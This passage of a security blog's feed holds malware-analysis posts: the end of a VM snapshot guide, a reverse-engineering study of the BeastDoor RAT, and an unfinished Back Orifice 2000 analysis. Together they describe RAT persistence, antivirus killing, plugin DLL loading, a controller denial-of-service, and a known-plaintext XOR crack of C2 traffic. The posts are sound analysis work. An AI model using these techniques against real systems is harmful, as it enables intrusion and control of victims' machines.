snapshot is a point-in-time image of a virtual machine that captures its exact state—including memory, disk data, and settings—at a specific moment.</p><p>It acts as a quick “undo” button for testing. It allows users to revert to a previous stable state, though it is not intended to be used as a long-term backup solution.</p><p>Snapshot → Snapshot Manager</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/4.png'><img src="/images/article/2026-2-21-ExpEnv/4.png" width=500></p><p>Next, click “Take Snapshot”:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/5.png'><img src="/images/article/2026-2-21-ExpEnv/5.png" width=500></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/6.png'><img src="/images/article/2026-2-21-ExpEnv/6.png" width=500></p><p>Now, you can create additional snapshots based on the clean base snapshot:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/7.png'><img src="/images/article/2026-2-21-ExpEnv/7.png" width=500></p><p>You can also create multiple snapshots derived from the original snapshot for different network configurations or installed applications. Note that you should power off your virtual machine of the current state before you go back to the previous state.</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/8.png'><img src="/images/article/2026-2-21-ExpEnv/8.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/9.png'><img src="/images/article/2026-2-21-ExpEnv/9.png" width=800></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/10.png'><img src="/images/article/2026-2-21-ExpEnv/10.png" width=800></p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/11.png'><img src="/images/article/2026-2-21-ExpEnv/11.png" width=800></p><p>In this case, I created three snapshots with different network configurations. The <code>Clean_Base_Isolated</code> snapshot uses a dedicated virtual network and is reserved specifically for malware analysis.</p><p>Therefore, VMware Tools are recommanded for transferring malware samples or analysis tools into the virtual machine. However, since some malware may manipulate the clipboard, you can alternatively use a shared folder configured in read-only mode during analysis.</p><h1 id="Revert-to-the-Last-Snapshot"><a href="#Revert-to-the-Last-Snapshot" class="headerlink" title="Revert to the Last Snapshot"></a>Revert to the Last Snapshot</h1><p>After analyzing malware, the virtual machine system may become unstable or compromised.</p><p>In such cases, you can easily revert to the last clean snapshot and start your next analysis session:</p><p align="center" class='item-img' data-src='/images/article/2026-2-21-ExpEnv/12.png'><img src="/images/article/2026-2-21-ExpEnv/12.png" width=800></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width=500></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Recently, I realized how impor</summary>
      
    
    
    
    <category term="Learning" scheme="https://iss4cf0ng.github.io/categories/Learning/"/>
    
    
    <category term="Learning" scheme="https://iss4cf0ng.github.io/tags/Learning/"/>
    
    <category term="Studying" scheme="https://iss4cf0ng.github.io/tags/Studying/"/>
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/tags/Malware-Analysis/"/>
    
    <category term="Setup" scheme="https://iss4cf0ng.github.io/tags/Setup/"/>
    
    <category term="Experiment" scheme="https://iss4cf0ng.github.io/tags/Experiment/"/>
    
  </entry>
  
  <entry>
    <title>[Studying] Analyzing BeastDoor</title>
    <link href="https://iss4cf0ng.github.io/2026/02/20/2026-2-20-Beast/"/>
    <id>https://iss4cf0ng.github.io/2026/02/20/2026-2-20-Beast/</id>
    <published>2026-02-20T08:14:41.000Z</published>
    <updated>2026-02-25T16:34:55.994Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <a href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-StudyingRAT/">Inside Different Generations of RATs</a>. If you are interested in the full series, please click the link above.</p><p>This article presents a reverse engineering analysis of BeastDoor(2002), focusing on its internal architecture and communication protocol design.</p><h1 id="BeastDoor"><a href="#BeastDoor" class="headerlink" title="BeastDoor"></a>BeastDoor</h1><p>Beast (a.k.a BeastDoor) is a Windows-based backdoor trojan horse. It is capable of infecting versions of Windows from 95 to XP. It was written in Delphi and released first y its author Tataye in 2002 <sup><a href="#fn_1" id="reffn_1">1</a></sup>. Considering the time period, Beast is a powerful RAT since it provides multiple and advanced features.</p><p>The earliest publicly available version on the internet is 1.8, while the final released version is 2.07. This article analyzes version 2.07 through reverse engineering.</p><p>Since this tool primarily targets Windows XP, some feature may not function correctly on modern operation systems such as Windows 10 or Windows 11.</p><h1 id="Experimental-Environmental-Setup"><a href="#Experimental-Environmental-Setup" class="headerlink" title="Experimental Environmental Setup"></a>Experimental Environmental Setup</h1><p>To safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system</p><div class="table-container"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>PEView</td><td>Static analysis tool for examining PE and COFF file structures (EXE, DLL, OBJ, LIB)</td></tr><tr><td>ExeInfo</td><td>Tool for identifying packers and analyzing PE metadata</td></tr><tr><td>UPX</td><td>Packing and unpacking tool for PE files</td></tr><tr><td>AsDie</td><td>PE unpacking and detection tool</td></tr><tr><td>Wireshark</td><td>Network protocol analyzer used to capture and inspect live or recorded traffic</td></tr><tr><td>Ghidra</td><td>Open-source software reverse engineering framework developed by the NSA</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>Device</th><th>IP Address</th><th>Description</th></tr></thead><tbody><tr><td>Windows XP x86 (VM)</td><td>192.168.85.2</td><td>Victim machine used for executing both the controller and payload</td></tr><tr><td>Windows 10 x64 (VM)</td><td>192.168.85.3</td><td>Analysis machine used for reverse engineering</td></tr></tbody></table></div><p>The two virtual machines where configured within an isolated internal network to prevent unintended external communication. If you want to know how to set up your experimental enviroment, please view:</p><ul><li><a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/">How to Setup Your Experimental Environment for Malware Analysis</a></li><li><a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-WinXpVMWareTool/">Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17</a></li></ul><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>Launch <code>Beast2.07.exe</code> on the Windows XP machine:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/1.png'><img src="/images/article/2026-2-20-Beast/1.png" width=500></p><p><code>Beast2.07.exe</code> is the attacker-side application. From a networking perspective, it can function as either a server or a client. It supports both direct connections and reverse connections.</p><p>To establish a connection, a payload (stub) must first be generated.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/2.png'><img src="/images/article/2026-2-20-Beast/2.png" width=500></p><p>Here, the term “Server” may be confusing from a modern perspective. In early-generation RATs, the “server” executable referred to the payload deployed on the victim machine, while the “client” executable provided the graphical interface for attackers. As firewall technilogies evolved and network security became more complex, attackers gradually shifted from direct connections to reverse connections. In addition, the attackers decided to develop builder technique. BeastDoor reflects this transitional design.</p><p>To avoid confusion, this article uses the terms:</p><ul><li>Payload: executable deployed on the victim machine</li><li>Controller: attacker-side management application</li></ul><p>BeastDoor provides process injection capabilities and several builder options, including:</p><ul><li>Notifications</li><li>Startup</li><li>AV-FW Kill</li><li>Misc</li><li>Exe Icon</li></ul><p><strong>Notifications</strong> are used to inform the attacker when a compromised machine comes online. Several terminologies used by Beast are now obsolete:</p><ul><li>SIN: Static IP Notification. Used for reverse connections; the host value refers to the attacker’s server.</li><li>ICQ: Instant messaging service popular in the late 1990s.</li><li>CGI: Common Gateway Interface. In early RATs, this often referred to an HTTP-based notification script.</li></ul><p>The <strong>Startup</strong> option allows the payload to modify registry entries or ActiveX-related settings to achieve persistence:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/3.png'><img src="/images/article/2026-2-20-Beast/3.png" width=500></p><p>The <strong>AV-FW</strong> Kill feature attempts to disable the Windows XP firewall and terminate specified antivirus processes:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/4.png'><img src="/images/article/2026-2-20-Beast/4.png" width=500></p><p>The <strong>Misc</strong> options provide additional execution behaviors. For example, the term “Melt” refers to deleting the original executable after execution. The payload copies itself to another directory, launches the replica, and terminates the original process.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/5.png'><img src="/images/article/2026-2-20-Beast/5.png" width=500></p><p>The <strong>Exe Icon</strong> option allows the attacker to change the payload’s icon to improve social engineering effectiveness.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/6.png'><img src="/images/article/2026-2-20-Beast/6.png" width=500></p><p>Once the payload is executed on the target machine, the controller displays the compromised host if the connection is successful.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/7.png'><img src="/images/article/2026-2-20-Beast/7.png" width=500>    <img src="/images/article/2026-2-20-Beast/8.png" width=500></p><h1 id="Protocol-Analysis"><a href="#Protocol-Analysis" class="headerlink" title="Protocol Analysis"></a>Protocol Analysis</h1><p>Using Wireshark, we can observe Beast 2.07’s network communication:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/25.png'><img src="/images/article/2026-2-20-Beast/25.png" width=700></p><p>Beast 2.07 uses plain text communication. Different C2 commands are identified using integer values.</p><p>The first string received by the controller represents the username of the compromised machine (confirmed through reverse engineering).</p><h1 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h1><h2 id="Payload-Analysis"><a href="#Payload-Analysis" class="headerlink" title="Payload Analysis"></a>Payload Analysis</h2><p>Both the payload and controller are written in Delphi:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/11.png'><img src="/images/article/2026-2-20-Beast/11.png" width=500></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/12.png'><img src="/images/article/2026-2-20-Beast/12.png" width=500></p><p>When analyzing the payload with Ghidra, I noticed that the Import Address Table appeared incomplete. Since a RAT payload is inherently a network application, the absence of APIs such as recv was suspicious.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/13.png'><img src="/images/article/2026-2-20-Beast/13.png" width=300></p><p>Ghidra provided the explanation: the binary was packed.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/17.png'><img src="/images/article/2026-2-20-Beast/17.png" width=300></p><p>Opening the file with PEView and ExeInfo confirmed that the payload was packed using UPX:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/14.png'><img src="/images/article/2026-2-20-Beast/14.png" width=500></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/15.png'><img src="/images/article/2026-2-20-Beast/15.png" width=700></p><p>When a PE file is packed with UPX, the original import table is compressed or removed and reconstructed dynamically at runtime. Therefore, static analysis tools initially display incomplete imports.</p><blockquote><p>If you are interest in how a normal application looks like in <code>PEView.exe</code>, please <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/#13-5-IAT">click here</a><br>If you are interest in IAT, please <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/#45-2-TLS">click here</a></p></blockquote><p>After unpacking with:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; upx.exe -d packed.exe -o unpacked.exe<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/16.png'><img src="/images/article/2026-2-20-Beast/16.png" width=700></p><p>Reloading the unpacked binary in Ghidra restores the full import table.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/18.png'><img src="/images/article/2026-2-20-Beast/18.png" width=300>    <img src="/images/article/2026-2-20-Beast/19.png" width=300></p><h3 id="Installation-Procedure"><a href="#Installation-Procedure" class="headerlink" title="Installation Procedure"></a>Installation Procedure</h3><p>The decompiled entry point reveals the installation logic:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/20.png'><img src="/images/article/2026-2-20-Beast/20.png" width=800></p><p>The payload modifies registry keys for persistence and then copies (or moves) itself to specific system directories:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/23.png'><img src="/images/article/2026-2-20-Beast/23.png" width=800></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/24.png'><img src="/images/article/2026-2-20-Beast/24.png" width=800></p><h3 id="Notification-Mechanism"><a href="#Notification-Mechanism" class="headerlink" title="Notification Mechanism"></a>Notification Mechanism</h3><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/21.png'><img src="/images/article/2026-2-20-Beast/21.png" width=800></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/22.png'><img src="/images/article/2026-2-20-Beast/22.png" width=800></p><p>The notification function transmits victim information to the attacker using different communication mechanisms, depending on configuration.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/26.png'><img src="/images/article/2026-2-20-Beast/26.png" width=500></p><h3 id="Main-Function"><a href="#Main-Function" class="headerlink" title="Main Function"></a>Main Function</h3><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/27.png'><img src="/images/article/2026-2-20-Beast/27.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/28.png'><img src="/images/article/2026-2-20-Beast/28.png" width=600></p><p>The main function contains logic that determines the role of the payload:</p><ul><li>Server mode: accepts incoming socket connections</li><li>Client mode: connects back to the attacker</li></ul><p>As mentioned eariler, Beast uses integer values to distinguish C2 commands.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/29.png'><img src="/images/article/2026-2-20-Beast/29.png" width=600></p><p>The tool also leverages the <code>ShowWindow</code> Win32 API for features labeled as “Lamer Stuff” and “Fun Stuff”. These features inspired a similar feature in my own tool <a href="https://iss4cf0ng.github.io/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/#FunStuff">DuplexSpy</a></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/30.png'><img src="/images/article/2026-2-20-Beast/30.png" width=600></p><h3 id="Remote-Plugin"><a href="#Remote-Plugin" class="headerlink" title="Remote Plugin"></a>Remote Plugin</h3><p>After analyzing the protocol and reverse engineering the implementation, the plugin mechanism becomes clear:</p><ol><li>The controller sends a DLL as a byte array.</li><li>The payload writes the DLL to disk.</li><li>The payload dynamically loads the DLL using <code>LoadLibraryA</code></li></ol><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/31.png'><img src="/images/article/2026-2-20-Beast/31.png" width=600></p><p>Captured traffic shows the <code>MZ</code> signature, confirming PE file transfer.</p><p>Beast identifiers this feature using integer value <code>101</code>, which equals <code>0x65</code> in hexadecimal:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/32.png'><img src="/images/article/2026-2-20-Beast/32.png" width=600></p><p>This plugin system is not fileless. Since the DLL is written to disk, modern antivirus software can detect this behavior. What’s more, plugins must be developed by the original author.</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/33.png'><img src="/images/article/2026-2-20-Beast/33.png" width=600></p><h2 id="Controller-Side-Analysis"><a href="#Controller-Side-Analysis" class="headerlink" title="Controller-Side Analysis"></a>Controller-Side Analysis</h2><p>The attacker-side application <code>Beast2.07</code> is also packed. However, it was packed by ASPack instead of UPX:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/34.png'><img src="/images/article/2026-2-20-Beast/34.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/35.png'><img src="/images/article/2026-2-20-Beast/35.png" width=600></p><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>When operating in server mode, the payload exposes a serious vulnerability in its plugin mechanism. Because the payload directly loads received DLL files using <code>LoadLibraryA</code>, an attacker could build a malicious DLL to achieve remote code execution or establish an alternative C2 channel (e.g., Meterpreter).</p><h2 id="Controller-Side"><a href="#Controller-Side" class="headerlink" title="Controller-Side"></a>Controller-Side</h2><p>Beast uses a plain-text protocol and trusts the first received string as machine identification. A simple Python script can send oversized data to the controller to trigger a denial-of-service condition:</p><p align="center" class='item-img' data-src='/images/article/2026-2-20-Beast/36.png'><img src="/images/article/2026-2-20-Beast/36.png" width=600></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Beast (BeastDoor) was a well-known (or notorious) remote access tool in the early 2000s. It represents a trasitional phase in offensive security techniques—shifting from direct connection models to reverse connection architectures. Although innovative for its time, it contains multiple vulnerabilities when evaluated under modern cybersecurity standards.</p><p>Through this reverse engineering process, I gained valuable insights into:</p><ul><li>UPX packing</li><li>ASPack protection</li><li>Legacy RAT architecture design</li></ul><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><blockquote id="fn_1"><sup>1</sup>. <a href="https://en.wikipedia.org/wiki/Beast_(Trojan_horse">https://en.wikipedia.org/wiki/Beast_(Trojan_horse</a>)<a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#8617;</a></blockquote><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/tea_party.jpg'><img src="/images/meme/tea_party.jpg" width=600></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article is part of my ser</summary>
      
    
    
    
    <category term="Studying/RAT" scheme="https://iss4cf0ng.github.io/categories/Studying-RAT/"/>
    
    
    <category term="Studying" scheme="https://iss4cf0ng.github.io/tags/Studying/"/>
    
    <category term="Reverse Engineering" scheme="https://iss4cf0ng.github.io/tags/Reverse-Engineering/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Malware" scheme="https://iss4cf0ng.github.io/tags/Malware/"/>
    
    <category term="Malware Analysis" scheme="https://iss4cf0ng.github.io/tags/Malware-Analysis/"/>
    
    <category term="Ghidra" scheme="https://iss4cf0ng.github.io/tags/Ghidra/"/>
    
    <category term="Beast" scheme="https://iss4cf0ng.github.io/tags/Beast/"/>
    
    <category term="BeastDoor" scheme="https://iss4cf0ng.github.io/tags/BeastDoor/"/>
    
    <category term="Beast RAT" scheme="https://iss4cf0ng.github.io/tags/Beast-RAT/"/>
    
    <category term="Packing" scheme="https://iss4cf0ng.github.io/tags/Packing/"/>
    
    <category term="Packed" scheme="https://iss4cf0ng.github.io/tags/Packed/"/>
    
    <category term="Unpacking" scheme="https://iss4cf0ng.github.io/tags/Unpacking/"/>
    
    <category term="Unpacked" scheme="https://iss4cf0ng.github.io/tags/Unpacked/"/>
    
    <category term="PEView" scheme="https://iss4cf0ng.github.io/tags/PEView/"/>
    
    <category term="PE File" scheme="https://iss4cf0ng.github.io/tags/PE-File/"/>
    
  </entry>
  
  <entry>
    <title>[Studying] Analyzing Back Orifice</title>
    <link href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-BackOrifice/"/>
    <id>https://iss4cf0ng.github.io/2026/02/18/2026-2-18-BackOrifice/</id>
    <published>2026-02-18T08:53:07.000Z</published>
    <updated>2026-02-25T17:48:04.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is part of my series: <a href="https://iss4cf0ng.github.io/2026/02/18/2026-2-18-StudyingRAT/">Inside Different Generations of RATs</a>. If you are interested in the full series, please refer to the linked article.</p><p align="center" class='item-img' data-src='/images/meme/mika_cute.jpg'><img src="/images/meme/mika_cute.jpg" width=200></p><h1 id="Back-Orifice"><a href="#Back-Orifice" class="headerlink" title="Back Orifice"></a>Back Orifice</h1><p>Back Orifice (often shortened to <strong>BO</strong>) is a computer program designed for remote system administration. It enables a user to control a computer running the Microsoft Windows operating system from a remote location<sup><a href="#fn_1" id="reffn_1">1</a></sup>. It was allegedly developed by a hacker group <strong>Cult of the Dead Cow</strong> in 1994 <sup><a href="#fn_2" id="reffn_2">2</a></sup>. Cult of the Dead Cow (a.k.a <strong>cDc</strong>) is a computer hacker organization founded in 1984 in Lubbock, Texas <sup><a href="#fn_3" id="reffn_3">3</a></sup>.</p><p>Back Orifice has a client-server (C/S) architecture. A small and unobtrusive server program is on one machine, which is remotely manipulated by a client program with a graphical user interface (GUI).</p><p>Back Orifice has two famous versions——version 1.20 and version 2000——where the former one was released in 1998 and the latter one (here 2000 stands for Windows 2000) was released in 1999. There is also a version “v1.2.0.5”, which updates the graphical user interface.</p><p>This article provides analysis of Back Orifice version 2000, since it is the most stable version.</p><h1 id="Experimental-Environment"><a href="#Experimental-Environment" class="headerlink" title="Experimental Environment"></a>Experimental Environment</h1><p>To safely conduct malware analysis, the environment should be isolated using virtual machines. Under no circumstances should malware be executed on a personal or production system</p><div class="table-container"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>PETool</td><td>Utility for inspecting and modifying Portable Executable (PE) files, including EXE and DLL modules</td></tr><tr><td>Process Explorer</td><td>Advanced process monitoring tool for examining running processes, loaded DLLs, and system handles</td></tr><tr><td>PEView</td><td>Static analysis tool for examining PE and COFF file structures (EXE, DLL, OBJ, LIB)</td></tr><tr><td>CFF Explorer</td><td>PE file editor and analyzer developed by NTCore, supporting 32-bit/64-bit executables and .NET assemblies</td></tr><tr><td>Wireshark</td><td>Network protocol analyzer used to capture and inspect live or recorded traffic</td></tr><tr><td>Ghidra</td><td>Open-source software reverse engineering framework developed by the NSA</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>Device</th><th>IP Address</th><th>Description</th></tr></thead><tbody><tr><td>Windows XP x86 (VM)</td><td>192.168.85.2</td><td>Victim machine used for executing the Back Orifice client component</td></tr><tr><td>Windows 10 x64 (VM)</td><td>192.168.85.3</td><td>Analyst machine used for reverse engineering and server-side interaction</td></tr></tbody></table></div><p>The two machines were configured within an isolated internal network to prevent unintended external communication.</p><p>If you want to know how to set up your experimental enviroment, please view:</p><ul><li><a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-HowToSetupYourExpEnv/">How to Setup Your Experimental Environment for Malware Analysis</a></li><li><a href="https://iss4cf0ng.github.io/2026/02/21/2026-2-21-WinXpVMWareTool/">Installing VMware Tools on Windows XP and Windows 95 with VMware WorkStation 17</a></li></ul><p align="center" class='item-img' data-src='/images/meme/rio_pc.jpg'><img src="/images/meme/rio_pc.jpg" width=300></p><h1 id="Back-Orifice-1-20"><a href="#Back-Orifice-1-20" class="headerlink" title="Back Orifice 1.20"></a>Back Orifice 1.20</h1><p>The GUI of the client (attacker-side) is illustrated as follows:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/1.png'><img src="/images/article/2026-2-18-BackOrifice/1.png" width=400>    <figcaption>    BackOrifice 1.20 (Well... I have no idea who this person is.)    </figcaption></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/2.png'><img src="/images/article/2026-2-18-BackOrifice/2.png" width=500></p><p>There are several files of this version:</p><ul><li>BO.txt: The documentation of Back Orifice</li><li>plugin.txt: The plugin programming documentation</li><li>boserve.exe: The Back Orifice self installing server (payload).</li><li>bogui.exe: The Back Orifice gui client.</li><li>boclient.exe: The Back Orifice next client.</li><li>boconfig.exe: utility to configure exename, port, password, and default plugin for a BO server.</li><li>melt.exe: Decompresses files compressed with the File freeze command.</li><li>freeze.exe: Compresses files that can be decompressed with the File melt command.</li></ul><p>Here the terms “melt” and “freeze” might be confusing. Some other RATs use the term “melt” to indicate deleting the payload executable after it has been launched, while Back Orifice uses this term to represent decompressing files and uses “freeze” to represent compressing files.</p><h1 id="Back-Orifice-2000"><a href="#Back-Orifice-2000" class="headerlink" title="Back Orifice 2000"></a>Back Orifice 2000</h1><p>The GUI of client (attacker-side) is illustrated as follow:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/3.png'><img src="/images/article/2026-2-18-BackOrifice/3.png" width=900></p><p>To launch the payload, launch <code>bo2kcfg.exe</code> instead of `bo2k.exe:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/4.png'><img src="/images/article/2026-2-18-BackOrifice/4.png" width=600></p><p>This GUI-based wizard allows the attacker to configure the payload.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/5.png'><img src="/images/article/2026-2-18-BackOrifice/5.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/6.png'><img src="/images/article/2026-2-18-BackOrifice/6.png" width=600></p><p>Here, the term “Server” might be confusing from a modern perspective. In early-generation RATs, a “server” executable referred to the payload deployed on the victim machine, while a “client” referred to an application used for controlling the victim machines. As firewall technologies evolved and network security improved, attackers gradually shifted from direct connections to reverse connections.</p><p>To avoid confusing, this article uses the terms:</p><ul><li>Controller: attacker-side application</li><li>Payload: executable deployed on the victim machines</li></ul><p>The payload configuration wizard allows the attacker to modify the parameter inside the given payload application:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/7.png'><img src="/images/article/2026-2-18-BackOrifice/7.png" width=700></p><p>Here, I use port <code>60000</code> for the binding port of the payload. Next, launch the payload on the target machine (Windows XP).</p><p>Start the controller application, navigate to the tool bar at the top. Select: File -&gt; New Server:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/8.png'><img src="/images/article/2026-2-18-BackOrifice/8.png" width=700></p><p>Once you have connected successfully, you can see the following result:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/9.png'><img src="/images/article/2026-2-18-BackOrifice/9.png" width=600></p><p>The “Server command client” allows the controller sends C2 commands to the payload. The mechanism works as follows: The controller sends C2 commands to the payload, the payload executes the corresponding funcitonallity and then return it. The controller receives the responses of the payload and displays them in the “Server Response” box.</p><h1 id="Protocol-Analysis"><a href="#Protocol-Analysis" class="headerlink" title="Protocol Analysis"></a>Protocol Analysis</h1><p>Back Orifice officially provides XOR encoding and 3DES encryption for protecting the communication. As mentioned in the wizard, 3DES is only available on the US version of the product. However, I can hardly find the “US version” of this software.</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/15.png'><img src="/images/article/2026-2-18-BackOrifice/15.png" width=600></p><h2 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h2><p>Back Orifice encodes the communication channel with a password string:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/16.png'><img src="/images/article/2026-2-18-BackOrifice/16.png" width=600></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/17.png'><img src="/images/article/2026-2-18-BackOrifice/17.png" width=800></p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/18.png'><img src="/images/article/2026-2-18-BackOrifice/18.png" width=600></p><p>Since this communication is encoded by XOR, I am going to demonstrate how to crack this channel with the method <strong>Known-Plaintext Attack</strong>.</p><p>First, notice that Back Orifice provides messagebox prompt up feature, we can send two chunks of large data to the server:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/19.png'><img src="/images/article/2026-2-18-BackOrifice/19.png" width=500>    <img src="/images/article/2026-2-18-BackOrifice/21.png" width=500></p><p>The result is shown as follow:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/20.png'><img src="/images/article/2026-2-18-BackOrifice/20.png" width=700></p><p>For these two packets, notice that they have the same data <code>0x52, 0x00, 0x00, 0x00, 0x1c, 0x27, 0xaf, 0x8b</code> as the prefix. Therefore, we can assume that this is the header or the C2 command for messagebox prompting.</p><p>There are data chunks that appear frequently in both packets: <code>6a 75 2d 07</code> and <code>69 76 2e 04</code>.</p><p>Notice that (The SCLD course killed my passion of Bolean Algebra) :</p><script type="math/tex; mode=display">\begin{align*}A \oplus B = C \implies A \oplus C = B\end{align*}</script><p>Proof:</p><script type="math/tex; mode=display">\begin{align*}\because A \oplus B = C \implies A'B + AB' = C\end{align*}</script><script type="math/tex; mode=display">\begin{align*}\therefore  A \oplus C &= A \oplus (A'B + AB') \\&= A'(A'B + AB') + A(A'B + AB')' \\&= A'B + A((A + B')(A' + B)) \\&= A'B + A(AB + A'B') \\&= A'B + AB \\&= B(A' + A) \\&= B\end{align*}</script><p>The ASCII result of <code>A</code> and <code>B</code> in hexadecimal are <code>0x41</code> and <code>0x42</code> respectively.</p><p>Next, perform XOR calculation:</p><script type="math/tex; mode=display">0\text{x}41 \oplus 0\text{x}6a = 0\text{x}2b \\0\text{x}41 \oplus 0\text{x}75 = 0\text{x}34 \\0\text{x}41 \oplus 0\text{x}2d = 0\text{x}6c \\0\text{x}41 \oplus 0\text{x}07 = 0\text{x}46</script><p>Therefore, the result is <code>2b 34 6c 46</code>. Notice that this value appears in the packet:</p><p align="center" class='item-img' data-src='/images/article/2026-2-18-BackOrifice/22.png'><img src="/images/article/2026-2-18-BackOrifice/22.png" width=600></p><p>This strongly implies that the repeating 4-byte sequence serves as the XOR key used to encode the communication. </p><p>Now, we can write a Python script for decoding the packets:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 